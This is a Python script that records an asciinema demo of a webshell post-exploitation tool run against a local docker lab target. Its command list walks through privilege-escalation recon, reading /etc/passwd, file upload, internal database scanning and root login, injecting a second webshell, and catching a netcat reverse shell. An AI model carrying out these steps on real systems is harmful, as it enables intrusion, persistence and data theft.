#!/usr/bin/env python3
"""Drive the Webshell-Sniper REPL against the local docker target and emit an
asciinema v2 ``.cast`` directly (no asciinema rec, so it works headless).

The REPL is spawned on a PTY; commands are "typed" character-by-character so the
recording shows realistic input, and every byte the REPL emits is captured with
a real timestamp.  Terminal cursor-position queries (DSR) are answered so a
prompt_toolkit/readline input loop doesn't stall.
"""

from __future__ import annotations

import fcntl
import json
import os
import pty
import select
import struct
import sys
import termios
import time

WIDTH, HEIGHT = 104, 32

# (command, seconds to linger after Enter) — the highlight reel.
# NB: addresses match the docker compose network (172.16.1.0/24): the internal
# MySQL (.2:3306) and PostgreSQL (.3:5432) services, and the host gateway (.1)
# that the target reverse-shells back to.
CMDS = [
    ("recon info", 2.0),                       # target summary
    ("recon privesc", 2.4),                    # aggregate privesc enumeration
    ("cd /var/www/html", 1.6),                 # prompt cwd updates (state-aware)
    ("file ls", 1.8),                          # cwd-aware directory table
    ("file read /etc/passwd", 2.0),            # read a remote file
    ("file put /tmp/notes.txt /var/www/html/notes.txt", 2.0),  # upload
    ("file get /var/www/html/notes.txt", 2.0), # download it back (round trip)
    ("id", 1.6),                               # bare input -> REMOTE (www-data)
    ("local", 1.2),                            # safety: prompt flips to LOCAL
    ("whoami", 1.5),                           # runs on the operator box (ubuntu)
    ("remote", 1.2),                           # back to REMOTE
    ("pivot scan --hosts 172.16.1.0/29 --ports 3306,5432", 4.4),  # pivot: find internal DBs
    ("pivot db --engine mysql --host db --user root --password root", 2.2),  # DB manager
    ("databases", 1.8),                        #   nested DB sub-REPL: list schemas
    ("quit", 1.2),                             #   leave the DB sub-REPL
    ("inject web --password s3cr3t", 2.4),     # inject a secondary webshell
    # --- real reverse shell: REPL spawns a local nc listener, target connects back ---
    ("pivot shell -i 172.16.1.1 -p 4444 -m bash --listen --tool nc", 3.0),
    ("id", 1.6),                               #   ...commands run in the caught shell
    ("uname -a", 1.8),
    ("exit", 1.6),                             #   close the shell -> back to the REPL
    ("quit", 1.8),                             # snapshots the session
]

TYPE_DELAY = 0.045


def main() -> None:
    out_path = sys.argv[1] if len(sys.argv) > 1 else "demo/sniper.cast"
    argv = ["python", "-m", "webshell_sniper",
            "http://127.0.0.1:8080/index.php", "POST", "c"]
    env = dict(os.environ, TERM="xterm-256color", COLUMNS=str(WIDTH), LINES=str(HEIGHT),
               COLORTERM="truecolor", FORCE_COLOR="1")

    pid, fd = pty.fork()
    if pid == 0:
        os.execvpe(argv[0], argv, env)
        os._exit(127)

    fcntl.ioctl(fd, termios.TIOCSWINSZ, struct.pack("HHHH", HEIGHT, WIDTH, 0, 0))
    events: list[list] = []
    start = time.monotonic()

    def pump(duration: float) -> bool:
        end = time.monotonic() + duration
        while time.monotonic() < end:
            r, _, _ = select.select([fd], [], [], 0.02)
            if not r:
                continue
            try:
                data = os.read(fd, 65536)
            except OSError:
                return False
            if not data:
                return False
            # Answer cursor-position queries so the input loop never blocks.
            if b"\x1b[6n" in data:
                with contextlib_suppress():
                    os.write(fd, b"\x1b[%d;1R" % HEIGHT)
            events.append([round(time.monotonic() - start, 4), "o",
                           data.decode("utf-8", "replace")])
        return True

    pump(3.2)  # banner + connectivity check
    for cmd, linger in CMDS:
        for ch in cmd:
            os.write(fd, ch.encode())
            pump(TYPE_DELAY)
        os.write(fd, b"\r")
        pump(linger)
    pump(1.5)

    with contextlib_suppress():
        os.close(fd)
    with contextlib_suppress():
        os.waitpid(pid, 0)

    header = {"version": 2, "width": WIDTH, "height": HEIGHT,
              "timestamp": int(time.time()),
              "env": {"TERM": "xterm-256color", "SHELL": "/bin/bash"}}
    os.makedirs(os.path.dirname(out_path) or ".", exist_ok=True)
    with open(out_path, "w") as f:
        f.write(json.dumps(header) + "\n")
        for ev in events:
            f.write(json.dumps(ev) + "\n")
    dur = events[-1][0] if events else 0.0
    print(f"wrote {out_path}: {len(events)} events, {dur:.1f}s")


class contextlib_suppress:
    def __enter__(self):
        return self

    def __exit__(self, *exc):
        return True


if __name__ == "__main__":
    main()
